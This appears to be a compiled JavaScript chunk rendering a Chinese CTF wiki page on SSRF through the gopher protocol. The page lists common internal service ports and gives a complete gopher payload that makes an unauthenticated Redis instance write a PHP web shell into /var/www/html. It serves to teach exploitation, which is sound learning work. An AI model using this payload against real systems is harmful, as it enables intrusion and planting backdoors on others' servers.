(window.__LOADABLE_LOADED_CHUNKS__=window.__LOADABLE_LOADED_CHUNKS__||[]).push([[16],{158:function(e,t,n){"use strict";n.r(t),function(e){n.d(t,"default",(function(){return u}));var r,a=n(95),o=(n(139),n(0),n(96));function l(){return(l=Object.assign||function(e){for(var t=1;t<arguments.length;t++){var n=arguments[t];for(var r in n)Object.prototype.hasOwnProperty.call(n,r)&&(e[r]=n[r])}return e}).apply(this,arguments)}function c(e,t){if(null==e)return{};var n,r,a=function(e,t){if(null==e)return{};var n,r,a={},o=Object.keys(e);for(r=0;r<o.length;r++)n=o[r],t.indexOf(n)>=0||(a[n]=e[n]);return a}(e,t);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(r=0;r<o.length;r++)n=o[r],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(a[n]=e[n])}return a}(r="undefined"!=typeof reactHotLoaderGlobal?reactHotLoaderGlobal.enterModule:void 0)&&r(e);"undefined"!=typeof reactHotLoaderGlobal&&reactHotLoaderGlobal.default.signature;var p,b,s=function(e){return function(t){return console.warn("Component "+e+" was not imported, exported, or provided by MDXProvider as global scope"),Object(o.b)("div",t)}},i={},d="wrapper";function u(e){var t=e.components,n=c(e,["components"]);return Object(o.b)(d,l({},i,n,{components:t,mdxType:"MDXLayout"}),Object(o.b)("h2",{className:"__internal",id:"gopher-协议"},"Gopher 协议",Object(o.b)("a",l({parentName:"h2"},{href:"#gopher-%E5%8D%8F%E8%AE%AE","aria-hidden":!0,className:"anchor"}),"#")),Object(o.b)("p",null,"在 http 出现之前，访问网页需要输入的是 "),Object(o.b)("p",null,"gopher://gopher.baidu.com/ "),Object(o.b)("p",null,"而不是"),Object(o.b)("p",null,Object(o.b)("a",l({parentName:"p"},{href:"https://www.baidu.com/",target:"_blank"}),"https://www.baidu.com/")),Object(o.b)("p",null,"而它被代替的原因一方面是收费，另一方面的原因是它固化的结构没有HTML网页灵活"),Object(o.b)("p",null,"利用 gopher 的方式有 FTP 爆破，REDIS，MYSQL，FAST CGI，XXE"),Object(o.b)("h2",{className:"__internal",id:"一些常用服务"},"一些常用服务",Object(o.b)("a",l({parentName:"h2"},{href:"#%E4%B8%80%E4%BA%9B%E5%B8%B8%E7%94%A8%E6%9C%8D%E5%8A%A1","aria-hidden":!0,className:"anchor"}),"#")),Object(o.b)("p",null,"Redis\t6379"),Object(o.b)("p",null,"FPM\t  9000"),Object(o.b)("p",null,"Smtp\t 25"),Object(o.b)("p",null,"Mysql\t3306"),Object(o.b)("p",null,"常用的协议"),Object(o.b)("p",null,"dict 、gopher"),Object(o.b)("p",null,"以下为经典的 Redis 未授权访问，以及常用 payload 的生成"),Object(o.b)("h2",{className:"__internal",id:"利用方式"},"利用方式",Object(o.b)("a",l({parentName:"h2"},{href:"#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F","aria-hidden":!0,className:"anchor"}),"#")),Object(o.b)("p",null,"比如常见的，web 有一个 curl 的功能，然后可以访问内网靶机，就可以用类似的方式进行命令传递"),Object(o.b)("p",null,"( payload 每经过一次传递就会被解码一次 )"),Object(o.b)("p",null,"redis"),Object(o.b)("p",null,Object(o.b)("img",l({parentName:"p"},{src:"/images/ssrf-gopher/3.png",alt:"3"}))),Object(o.b)("p",null,"Smtp 生成 payload"),Object(o.b)("p",null,Object(o.b)("img",l({parentName:"p"},{src:"/images/ssrf-gopher/1.png",alt:"1"}))),Object(o.b)("p",null,"Fpm 生成 payload"),Object(o.b)("p",null,Object(o.b)("img",l({parentName:"p"},{src:"/images/ssrf-gopher/2.png",alt:"2"}))),Object(o.b)("p",null,"gopher支持多行。因此要在传输的数据前加一个无用字符。比如 gopher://ip:port/",Object(o.b)("em",{parentName:"p"}," 通常用 ")," 并不是只能用 _ ，gopher协议会吃掉第一个字符"),Object(o.b)("h2",{className:"__internal",id:"关于-redis"},"关于 redis",Object(o.b)("a",l({parentName:"h2"},{href:"#%E5%85%B3%E4%BA%8E-redis","aria-hidden":!0,className:"anchor"}),"#")),Object(o.b)("p",null,"redis 的格式：每一个 *number 代表每一行命令，number 代表每行命令中数组中的元素个数。$number 代表每个元素的长度。"),Object(o.b)("p",null,"URL解码后可以看到创建 shell 的完整流程"),Object(o.b)("div",{className:"rcpress-highlight","data-language":"gopher://127.0.0.1:6379/_*1"},Object(o.b)("pre",l({parentName:"div"},{className:"language-gopher://127.0.0.1:6379/_*1"}),Object(o.b)("code",l({parentName:"pre"},{className:"language-gopher://127.0.0.1:6379/_*1"}),'$8\t\t\t\t\t\t\t//元素长度为8\nflushall\n*3\t\t\t\t\t\t\t//3个元素\n$3\nset\n$1\n1\n$31\n\n<?php echo "hello world" ?>\n\n*4\n$6\nconfig\n$3\nset\n$3\ndir\n$13\n/var/www/html\n*4\n$6\nconfig\n$3\nset\n$10\ndbfilename\n$9\nshell.php\n*1\n$4\nsave'))),Object(o.b)("p",null,"即为redis将输入的语句保存在指定位置的php文件中，生成后门"))}u.isMDXComponent=!0,u=Object(a.hot)(e)(u),(p="undefined"!=typeof reactHotLoaderGlobal?reactHotLoaderGlobal.default:void 0)&&(p.register(s,"makeShortcode","E:\\Code\\Project\\wgpsec\\WgpsecWiki\\docs\\knowledge\\ctf\\ssrf-gopher.md"),p.register(i,"layoutProps","E:\\Code\\Project\\wgpsec\\WgpsecWiki\\docs\\knowledge\\ctf\\ssrf-gopher.md"),p.register(d,"MDXLayout","E:\\Code\\Project\\wgpsec\\WgpsecWiki\\docs\\knowledge\\ctf\\ssrf-gopher.md"),p.register(u,"MDXContent","E:\\Code\\Project\\wgpsec\\WgpsecWiki\\docs\\knowledge\\ctf\\ssrf-gopher.md")),(b="undefined"!=typeof reactHotLoaderGlobal?reactHotLoaderGlobal.leaveModule:void 0)&&b(e)}.call(this,n(23)(e))}}]);